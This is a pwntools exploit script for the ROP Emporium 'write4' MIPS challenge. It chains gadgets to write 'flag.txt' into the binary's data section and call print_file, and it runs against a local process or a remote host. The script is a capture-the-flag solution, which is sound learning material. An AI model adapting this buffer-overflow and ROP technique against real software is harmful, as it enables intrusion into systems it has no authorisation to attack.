from pwn import *

splash()
elf = context.binary = ELF("./write4_mipsel")


class ROP:
    gadget1    = 0x00400930  # lw $t9, 0xc($sp); lw $t0, 8($sp); lw $t1, 4($sp); sw $t1, ($t0); jalr $t9; addi $sp, $sp, 0x10;
    data_start = 0x00411000
    gadget2    = 0x00400948  # lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(36)

    payload = [
        padding,
        ROP.gadget1,
        0xDEADBEEF,
        b"flag",
        ROP.data_start,
        ROP.gadget1,
        0xDEADBEEF,
        b".txt",
        ROP.data_start+4,
        ROP.gadget2,
        0xDEADBEEF,
        elf.plt.print_file,
        ROP.data_start
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()